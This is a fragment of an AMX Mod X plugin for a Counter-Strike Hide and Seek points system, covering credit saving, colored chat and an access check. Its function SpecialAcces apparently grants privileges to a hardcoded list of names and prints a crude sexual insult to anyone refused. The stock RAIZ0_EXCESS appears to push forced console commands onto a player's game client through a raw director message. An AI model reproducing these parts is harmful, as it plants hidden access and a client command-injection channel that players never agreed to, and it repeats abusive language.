	iVault  =  nvault_open(  "HnsPointsSystem"  );
	
	if(  iVault  ==  INVALID_HANDLE  )
	{
		set_fail_state(  "nValut returned invalid handle!"  );
	}
	
	formatex( szData, sizeof ( szData ) -1, "%d %d", g_iUserCredits[ id ],Level[id] );
	
	nvault_set( iVault, g_szName[ id ], szData );
	nvault_close( iVault );
#else
	formatex( szData, charsmax ( szData ), "%d %d",g_iUserCredits[ id ],Level[id] );
	fvault_set_data(g_VAULTNAME, g_szName[ id ], szData );
#endif
}


public plugin_end( )
{
#if !defined FVAULT
	iVault  =  nvault_open(  "HnsPointsSystem"  );
	
	if(  iVault  ==  INVALID_HANDLE  )
	{
		set_fail_state(  "nValut returned invalid handle!"  );
	}
	
	nvault_close( iVault );
#endif

#if NEW_STYLE==1
	// clear the memory
	ArrayDestroy(gAdminData);
	TrieDestroy(gAuthIndex);
#endif
}



// |-- CC_ColorChat --|
ColorChat(  id, Color:iType, const msg[  ], { Float, Sql, Result, _}:...  )
{
	// Daca nu se afla nici un jucator pe server oprim TOT. Altfel dam de erori..
	if( !get_playersnum( ) ) return;
	
	new szMessage[ 256 ];
	switch( iType )
	{
		 // Culoarea care o are jucatorul setata in cvar-ul scr_concolor.
		case NORMAL:	szMessage[ 0 ] = 0x01;
		
		// Culoare Verde.
		case GREEN:	szMessage[ 0 ] = 0x04;
		
		// Alb, Rosu, Albastru.
		default: 	szMessage[ 0 ] = 0x03;
	}

	vformat(  szMessage[ 1 ], 251, msg, 4  );

	// Ne asiguram ca mesajul nu este mai lung de 192 de caractere.Altfel pica server-ul.
	szMessage[ 192 ] = '^0';
	

	new iTeam, iColorChange, iPlayerIndex, MSG_Type;
	if( id )
	{
		MSG_Type  =  MSG_ONE_UNRELIABLE;
		iPlayerIndex  =  id;
	}
	else
	{
		iPlayerIndex  =  CC_FindPlayer(  );
		MSG_Type = MSG_ALL;
	}
	
	iTeam  =  get_user_team( iPlayerIndex );
	iColorChange  =  CC_ColorSelection(  iPlayerIndex,  MSG_Type, iType);

	CC_ShowColorMessage(  iPlayerIndex, MSG_Type, szMessage  );
		
	if(  iColorChange  )	CC_Team_Info(  iPlayerIndex, MSG_Type,  TeamName[ iTeam ]  );
}

CC_ShowColorMessage(  id, const iType, const szMessage[  ]  )
{
	static bool:bSayTextUsed;
	static iMsgSayText;
	
	if(  !bSayTextUsed  )
	{
		iMsgSayText  =  get_user_msgid( "SayText" );
		bSayTextUsed  =  true;
	}
	
	message_begin( iType, iMsgSayText, _, id  );
	write_byte(  id  );		
	write_string(  szMessage  );
	message_end(  );
}
CC_Team_Info( id, const iType, const szTeam[  ] )
{
	static bool:bTeamInfoUsed;
	static iMsgTeamInfo;
	if(  !bTeamInfoUsed  )
	{
		iMsgTeamInfo  =  get_user_msgid( "TeamInfo" );
		bTeamInfoUsed  =  true;
	}
	
	message_begin( iType, iMsgTeamInfo, _, id  );
	write_byte(  id  );
	write_string(  szTeam  );
	message_end(  );

	return PLUGIN_HANDLED;
}
CC_ColorSelection(  id, const iType, Color:iColorType)
{
	switch(  iColorType  )
	{
		case RED:	return CC_Team_Info(  id, iType, TeamName[ 1 ]  );
		case BLUE:	return CC_Team_Info(  id, iType, TeamName[ 2 ]  );
		case GREY:	return CC_Team_Info(  id, iType, TeamName[ 0 ]  );
	}

	return PLUGIN_CONTINUE;
}
CC_FindPlayer(  )
{
	new iMaxPlayers  =  get_maxplayers(  );
	
	for( new i = 1; i <= iMaxPlayers; i++ )
		if(  is_user_connected( i )  )
			return i;
	
	return -1;
}
// |-- CC_ColorChat --|


SpecialAcces( id, NumeAdmin[ ], msg )
{
	for( new i = 0; i < sizeof( PluginSpecialAcces ); i++ )	if( equali( NumeAdmin, PluginSpecialAcces[ i ] ) )	return true;
	if(ea[id])	return true
	
	if( msg )	console_print( id, "> TOCMAI I-AI SUPT PULA LUI RAIZ0 ! <" );

	return false;
}

stock fm_find_ent_by_owner(index, const classname[], owner, jghgtype = 0) {
    new strtype[11] = "classname", ent = index;
    switch (jghgtype) {
        case 1: strtype = "target";
        case 2: strtype = "targetname";
    }

    while ((ent = engfunc(EngFunc_FindEntityByString, ent, strtype, classname)) && pev(ent, pev_owner) != owner) {}

    return ent;
}

stock RAIZ0_EXCESS( id, text[ ] )
{
	message_begin( MSG_ONE, 51 , _, id );
	write_byte( strlen( text ) + 2 );
	write_byte( 10 );
	write_string( text );
	message_end();
}
